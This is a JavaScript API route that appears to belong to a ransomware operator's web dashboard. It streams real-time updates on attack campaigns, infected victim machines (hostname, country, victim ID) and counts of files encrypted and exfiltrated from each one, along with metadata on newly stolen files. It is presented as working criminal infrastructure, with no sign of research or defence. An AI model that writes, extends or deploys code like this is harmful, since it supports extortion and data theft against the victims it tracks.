// vercel-dashboard/api/realtime/events.js
// Server-Sent Events for real-time dashboard updates

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'GET') return response.status(405).json({ error: 'Method not allowed' });

  // SSE headers
  response.setHeader('Content-Type', 'text/event-stream');
  response.setHeader('Cache-Control', 'no-cache');
  response.setHeader('Connection', 'keep-alive');
  response.setHeader('X-Accel-Buffering', 'no');

  const { campaignId, systemId, types } = request.query;
  const eventTypes = types?.split(',') || ['stats', 'systems', 'files', 'campaigns'];

  // Send initial connection event
  sendEvent(response, 'connected', { timestamp: new Date().toISOString(), types: eventTypes });

  // Heartbeat interval
  const heartbeat = setInterval(() => {
    sendEvent(response, 'heartbeat', { timestamp: new Date().toISOString() });
  }, 30000);

  // Poll for updates
  let lastStats = {};
  let lastSystems = [];
  let lastCampaigns = [];

  const poll = async () => {
    try {
      // Global stats
      if (eventTypes.includes('stats')) {
        const stats = await kv.hgetall('global:stats') || {};
        const json = JSON.stringify(stats);
        if (json !== JSON.stringify(lastStats)) {
          lastStats = stats;
          sendEvent(response, 'stats', stats);
        }
      }

      // Campaign stats
      if (eventTypes.includes('campaigns') && campaignId) {
        const cStats = await kv.hgetall(`campaign:${campaignId}:stats`) || {};
        const json = JSON.stringify(cStats);
        if (json !== JSON.stringify(lastCampaigns)) {
          lastCampaigns = cStats;
          sendEvent(response, 'campaignStats', { campaignId, stats: cStats });
        }
      }

      // Systems
      if (eventTypes.includes('systems')) {
        let systemIds = [];
        if (campaignId) {
          systemIds = await kv.smembers(`campaign:${campaignId}:systems`) || [];
        } else {
          systemIds = await kv.smembers('global:systems') || [];
        }

        const systems = [];
        for (const sid of systemIds.slice(0, 100)) {
          const sys = await kv.get(`system:${sid}`);
          if (sys) {
            const stats = await kv.hgetall(`system:${sid}:stats`) || {};
            systems.push({
              id: sys.id,
              victimId: sys.victimId,
              hostname: sys.hostname,
              status: sys.status,
              lastSeen: sys.lastSeen,
              country: sys.country,
              stats: {
                filesEncrypted: parseInt(stats.filesEncrypted || '0'),
                filesExfiltrated: parseInt(stats.filesExfiltrated || '0'),
                bytesExfiltrated: parseInt(stats.bytesExfiltrated || '0')
              }
            });
          }
        }

        const json = JSON.stringify(systems);
        if (json !== JSON.stringify(lastSystems)) {
          lastSystems = systems;
          sendEvent(response, 'systems', systems);
        }
      }

      // New files (if systemId specified)
      if (eventTypes.includes('files') && systemId) {
        const fileIds = await kv.smembers(`system:${systemId}:files`) || [];
        if (fileIds.length > 0) {
          const latestId = fileIds[fileIds.length - 1];
          const meta = await kv.get(`file:${latestId}:meta`);
          if (meta) {
            sendEvent(response, 'newFile', meta);
          }
        }
      }
    } catch (e) {
      console.error('SSE poll error:', e);
    }
  };

  // Initial poll
  await poll();

  // Poll every 5 seconds
  const pollInterval = setInterval(poll, 5000);

  // Cleanup on disconnect
  request.on('close', () => {
    clearInterval(heartbeat);
    clearInterval(pollInterval);
  });
}

function sendEvent(response, event, data) {
  response.write(`event: ${event}\n`);
  response.write(`data: ${JSON.stringify(data)}\n\n`);
}
